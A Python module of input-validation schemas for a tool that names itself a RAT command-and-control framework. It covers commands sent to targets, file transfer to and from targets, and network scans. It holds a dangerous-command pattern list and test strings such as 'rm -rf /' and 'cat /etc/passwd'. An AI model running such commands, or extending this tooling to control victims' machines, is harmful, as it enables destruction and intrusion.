#!/usr/bin/env python3
"""
Input Validation Schemas for Oranolio RAT - Elite C2 Framework
Provides comprehensive input validation for all user inputs
"""

import re
import ipaddress
import validators
from typing import Any, Dict, List, Optional, Union, Callable
from dataclasses import dataclass
from enum import Enum
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ValidationError(Exception):
    """Custom exception for validation errors"""
    def __init__(self, message: str, field: str = None):
        self.message = message
        self.field = field
        super().__init__(message)

class SeverityLevel(Enum):
    """Severity levels for validation errors"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class ValidationResult:
    """Result of validation operation"""
    is_valid: bool
    errors: List[str]
    warnings: List[str]
    sanitized_value: Any = None

class BaseValidator:
    """Base class for all validators"""
    
    def __init__(self, required: bool = True, min_length: int = None, max_length: int = None):
        self.required = required
        self.min_length = min_length
        self.max_length = max_length
    
    def validate(self, value: Any) -> ValidationResult:
        """Validate a value"""
        errors = []
        warnings = []
        
        # Check if required field is present
        if self.required and (value is None or value == ""):
            errors.append("This field is required")
            return ValidationResult(False, errors, warnings)
        
        # Skip validation if value is None and not required
        if not self.required and (value is None or value == ""):
            return ValidationResult(True, errors, warnings, value)
        
        # Validate length constraints
        if isinstance(value, str):
            if self.min_length and len(value) < self.min_length:
                errors.append(f"Minimum length is {self.min_length} characters")
            if self.max_length and len(value) > self.max_length:
                errors.append(f"Maximum length is {self.max_length} characters")
        
        return ValidationResult(len(errors) == 0, errors, warnings, value)

class StringValidator(BaseValidator):
    """Validator for string inputs"""
    
    def __init__(self, pattern: str = None, allowed_chars: str = None, 
                 forbidden_chars: str = None, **kwargs):
        super().__init__(**kwargs)
        self.pattern = pattern
        self.allowed_chars = allowed_chars
        self.forbidden_chars = forbidden_chars
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        if not isinstance(value, str):
            result.errors.append("Value must be a string")
            return result
        
        # Check pattern
        if self.pattern and not re.match(self.pattern, value):
            result.errors.append(f"Value does not match required pattern")
        
        # Check allowed characters
        if self.allowed_chars:
            invalid_chars = set(value) - set(self.allowed_chars)
            if invalid_chars:
                result.errors.append(f"Contains invalid characters: {', '.join(invalid_chars)}")
        
        # Check forbidden characters
        if self.forbidden_chars:
            forbidden_found = set(value) & set(self.forbidden_chars)
            if forbidden_found:
                result.errors.append(f"Contains forbidden characters: {', '.join(forbidden_found)}")
        
        result.is_valid = len(result.errors) == 0
        return result

class EmailValidator(BaseValidator):
    """Validator for email addresses"""
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        if not isinstance(value, str):
            result.errors.append("Email must be a string")
            return result
        
        # Use validators library for email validation
        if not validators.email(value):
            result.errors.append("Invalid email format")
        
        # Additional checks
        if len(value) > 254:  # RFC 5321 limit
            result.errors.append("Email address too long")
        
        # Check for suspicious patterns
        suspicious_patterns = [
            r'\.{2,}',  # Multiple consecutive dots
            r'@.*@',    # Multiple @ symbols
            r'^\s|\s$', # Leading/trailing whitespace
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, value):
                result.warnings.append("Email contains suspicious patterns")
                break
        
        result.is_valid = len(result.errors) == 0
        return result

class IPAddressValidator(BaseValidator):
    """Validator for IP addresses"""
    
    def __init__(self, allow_private: bool = True, allow_loopback: bool = True, **kwargs):
        super().__init__(**kwargs)
        self.allow_private = allow_private
        self.allow_loopback = allow_loopback
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        if not isinstance(value, str):
            result.errors.append("IP address must be a string")
            return result
        
        try:
            ip = ipaddress.ip_address(value)
            
            # Check if private IPs are allowed
            if not self.allow_private and ip.is_private:
                result.errors.append("Private IP addresses are not allowed")
            
            # Check if loopback IPs are allowed
            if not self.allow_loopback and ip.is_loopback:
                result.errors.append("Loopback IP addresses are not allowed")
            
            # Check for reserved IPs
            if ip.is_reserved:
                result.warnings.append("IP address is reserved")
            
            # Check for multicast IPs
            if ip.is_multicast:
                result.warnings.append("IP address is multicast")
            
        except ValueError:
            result.errors.append("Invalid IP address format")
        
        result.is_valid = len(result.errors) == 0
        return result

class PortValidator(BaseValidator):
    """Validator for port numbers"""
    
    def __init__(self, min_port: int = 1, max_port: int = 65535, **kwargs):
        super().__init__(**kwargs)
        self.min_port = min_port
        self.max_port = max_port
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        try:
            port = int(value)
            
            if port < self.min_port or port > self.max_port:
                result.errors.append(f"Port must be between {self.min_port} and {self.max_port}")
            
            # Check for well-known ports
            if port < 1024:
                result.warnings.append("Port is in well-known range (0-1023)")
            
            # Check for registered ports
            elif port < 49152:
                result.warnings.append("Port is in registered range (1024-49151)")
            
        except (ValueError, TypeError):
            result.errors.append("Port must be a valid integer")
        
        result.is_valid = len(result.errors) == 0
        return result

class CommandValidator(BaseValidator):
    """Validator for command inputs"""
    
    def __init__(self, allowed_commands: List[str] = None, **kwargs):
        super().__init__(**kwargs)
        self.allowed_commands = allowed_commands or []
        self.dangerous_patterns = [
            r'rm\s+-rf\s+/',  # Dangerous rm command
            r'mkfs\.',        # Format commands
            r'dd\s+if=',      # Disk operations
            r'>\s*/dev/',     # Device redirection
            r'chmod\s+777',   # Overly permissive permissions
            r'chown\s+root',  # Root ownership changes
        ]
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        if not isinstance(value, str):
            result.errors.append("Command must be a string")
            return result
        
        # Check if command is in allowed list
        if self.allowed_commands:
            command_parts = value.strip().split()
            if command_parts and command_parts[0] not in self.allowed_commands:
                result.errors.append(f"Command '{command_parts[0]}' is not allowed")
        
        # Check for dangerous patterns
        for pattern in self.dangerous_patterns:
            if re.search(pattern, value, re.IGNORECASE):
                result.warnings.append(f"Command contains potentially dangerous pattern: {pattern}")
        
        # Check for injection attempts
        injection_patterns = [
            r'[;&|`$]',  # Command injection characters
            r'<[^>]*>',  # HTML/XML tags
            r'javascript:',  # JavaScript protocol
            r'data:',     # Data protocol
        ]
        
        for pattern in injection_patterns:
            if re.search(pattern, value, re.IGNORECASE):
                result.errors.append("Command contains potential injection patterns")
                break
        
        result.is_valid = len(result.errors) == 0
        return result

class FilePathValidator(BaseValidator):
    """Validator for file paths"""
    
    def __init__(self, allowed_extensions: List[str] = None, 
                 forbidden_extensions: List[str] = None, **kwargs):
        super().__init__(**kwargs)
        self.allowed_extensions = allowed_extensions or []
        self.forbidden_extensions = forbidden_extensions or ['.exe', '.bat', '.cmd', '.scr', '.pif']
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        if not isinstance(value, str):
            result.errors.append("File path must be a string")
            return result
        
        # Check for path traversal
        if '..' in value or value.startswith('/') or '\\' in value:
            result.errors.append("Path traversal detected")
        
        # Check for forbidden extensions
        if self.forbidden_extensions:
            for ext in self.forbidden_extensions:
                if value.lower().endswith(ext.lower()):
                    result.errors.append(f"File extension '{ext}' is not allowed")
        
        # Check for allowed extensions
        if self.allowed_extensions:
            file_ext = '.' + value.split('.')[-1].lower() if '.' in value else ''
            if file_ext and file_ext not in [ext.lower() for ext in self.allowed_extensions]:
                result.errors.append(f"File extension '{file_ext}' is not in allowed list")
        
        result.is_valid = len(result.errors) == 0
        return result

class JSONValidator(BaseValidator):
    """Validator for JSON inputs"""
    
    def __init__(self, schema: Dict = None, **kwargs):
        super().__init__(**kwargs)
        self.schema = schema
    
    def validate(self, value: Any) -> ValidationResult:
        result = super().validate(value)
        if not result.is_valid:
            return result
        
        # Try to parse as JSON if it's a string
        if isinstance(value, str):
            try:
                import json
                parsed_value = json.loads(value)
                result.sanitized_value = parsed_value
            except json.JSONDecodeError as e:
                result.errors.append(f"Invalid JSON format: {e}")
                return result
        else:
            parsed_value = value
        
        # Validate against schema if provided
        if self.schema:
            schema_errors = self._validate_schema(parsed_value, self.schema)
            result.errors.extend(schema_errors)
        
        result.is_valid = len(result.errors) == 0
        return result
    
    def _validate_schema(self, data: Any, schema: Dict) -> List[str]:
        """Validate data against JSON schema"""
        errors = []
        
        for key, rules in schema.items():
            if key not in data:
                if rules.get('required', False):
                    errors.append(f"Required field '{key}' is missing")
                continue
            
            value = data[key]
            field_type = rules.get('type')
            
            if field_type == 'string' and not isinstance(value, str):
                errors.append(f"Field '{key}' must be a string")
            elif field_type == 'integer' and not isinstance(value, int):
                errors.append(f"Field '{key}' must be an integer")
            elif field_type == 'boolean' and not isinstance(value, bool):
                errors.append(f"Field '{key}' must be a boolean")
            elif field_type == 'array' and not isinstance(value, list):
                errors.append(f"Field '{key}' must be an array")
            elif field_type == 'object' and not isinstance(value, dict):
                errors.append(f"Field '{key}' must be an object")
        
        return errors

class ValidationManager:
    """Manages validation schemas and operations"""
    
    def __init__(self):
        self.schemas = {}
        self._register_default_schemas()
    
    def _register_default_schemas(self):
        """Register default validation schemas"""
        
        # Authentication schemas
        self.schemas['login'] = {
            'email': EmailValidator(required=True, max_length=254),
            'password': StringValidator(required=True, min_length=8, max_length=128),
            'remember_me': StringValidator(required=False, pattern=r'^(true|false)$')
        }
        
        self.schemas['register'] = {
            'email': EmailValidator(required=True, max_length=254),
            'password': StringValidator(required=True, min_length=8, max_length=128),
            'confirm_password': StringValidator(required=True, min_length=8, max_length=128),
            'full_name': StringValidator(required=False, max_length=100)
        }
        
        # Command schemas
        self.schemas['command'] = {
            'command': CommandValidator(required=True, max_length=1000),
            'target_id': StringValidator(required=True, pattern=r'^[a-zA-Z0-9_-]+$'),
            'async': StringValidator(required=False, pattern=r'^(true|false)$')
        }
        
        # File operation schemas
        self.schemas['file_upload'] = {
            'file_path': FilePathValidator(required=True, max_length=500),
            'target_id': StringValidator(required=True, pattern=r'^[a-zA-Z0-9_-]+$'),
            'overwrite': StringValidator(required=False, pattern=r'^(true|false)$')
        }
        
        self.schemas['file_download'] = {
            'file_path': FilePathValidator(required=True, max_length=500),
            'target_id': StringValidator(required=True, pattern=r'^[a-zA-Z0-9_-]+$')
        }
        
        # Network schemas
        self.schemas['network_scan'] = {
            'target_ip': IPAddressValidator(required=True),
            'port_range': StringValidator(required=False, pattern=r'^\d+-\d+$'),
            'scan_type': StringValidator(required=False, pattern=r'^(tcp|udp|both)$')
        }
        
        # Configuration schemas
        self.schemas['config'] = {
            'host': IPAddressValidator(required=True),
            'port': PortValidator(required=True),
            'ssl_enabled': StringValidator(required=False, pattern=r'^(true|false)$'),
            'debug_mode': StringValidator(required=False, pattern=r'^(true|false)$')
        }
        
        # API schemas
        self.schemas['api_key'] = {
            'name': StringValidator(required=True, min_length=3, max_length=50),
            'permissions': JSONValidator(required=False),
            'expires_in': StringValidator(required=False, pattern=r'^\d+[hdwmy]$')
        }
    
    def validate(self, schema_name: str, data: Dict[str, Any]) -> ValidationResult:
        """Validate data against a schema"""
        if schema_name not in self.schemas:
            return ValidationResult(False, [f"Unknown schema: {schema_name}"], [])
        
        schema = self.schemas[schema_name]
        errors = []
        warnings = []
        sanitized_data = {}
        
        for field, validator in schema.items():
            value = data.get(field)
            result = validator.validate(value)
            
            if not result.is_valid:
                errors.extend([f"{field}: {error}" for error in result.errors])
            
            warnings.extend([f"{field}: {warning}" for warning in result.warnings])
            
            if result.sanitized_value is not None:
                sanitized_data[field] = result.sanitized_value
        
        return ValidationResult(
            is_valid=len(errors) == 0,
            errors=errors,
            warnings=warnings,
            sanitized_value=sanitized_data
        )
    
    def register_schema(self, name: str, schema: Dict[str, BaseValidator]):
        """Register a new validation schema"""
        self.schemas[name] = schema
    
    def get_schema(self, name: str) -> Optional[Dict[str, BaseValidator]]:
        """Get a validation schema by name"""
        return self.schemas.get(name)
    
    def list_schemas(self) -> List[str]:
        """List all available schemas"""
        return list(self.schemas.keys())

# Global validation manager instance
validation_manager = ValidationManager()

def validate_input(schema_name: str, data: Dict[str, Any]) -> ValidationResult:
    """Convenience function to validate input"""
    return validation_manager.validate(schema_name, data)

def sanitize_string(value: str, max_length: int = None) -> str:
    """Sanitize a string input"""
    if not isinstance(value, str):
        return ""
    
    # Remove null bytes and control characters
    sanitized = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', value)
    
    # Trim whitespace
    sanitized = sanitized.strip()
    
    # Limit length
    if max_length and len(sanitized) > max_length:
        sanitized = sanitized[:max_length]
    
    return sanitized

def validate_email(email: str) -> bool:
    """Quick email validation"""
    result = EmailValidator().validate(email)
    return result.is_valid

def validate_ip_address(ip: str) -> bool:
    """Quick IP address validation"""
    result = IPAddressValidator().validate(ip)
    return result.is_valid

def validate_port(port: Union[str, int]) -> bool:
    """Quick port validation"""
    result = PortValidator().validate(port)
    return result.is_valid

# Example usage and testing
if __name__ == "__main__":
    print("Input Validation Schemas")
    print("=" * 30)
    
    # Test email validation
    print("Testing email validation...")
    test_emails = [
        "user@example.com",
        "invalid-email",
        "user@domain.co.uk",
        "user+tag@example.org"
    ]
    
    for email in test_emails:
        result = validate_email(email)
        print(f"  {email}: {'✓' if result else '✗'}")
    
    # Test command validation
    print("\nTesting command validation...")
    test_commands = [
        "ls -la",
        "rm -rf /",
        "whoami",
        "cat /etc/passwd"
    ]
    
    for cmd in test_commands:
        result = CommandValidator().validate(cmd)
        print(f"  {cmd}: {'✓' if result.is_valid else '✗'} - {result.errors}")
    
    # Test schema validation
    print("\nTesting schema validation...")
    test_data = {
        'email': 'user@example.com',
        'password': 'password123',
        'remember_me': 'true'
    }
    
    result = validate_input('login', test_data)
    print(f"Login validation: {'✓' if result.is_valid else '✗'}")
    if result.errors:
        print(f"  Errors: {result.errors}")
    if result.warnings:
        print(f"  Warnings: {result.warnings}")
    
    print("\nValidation system ready!")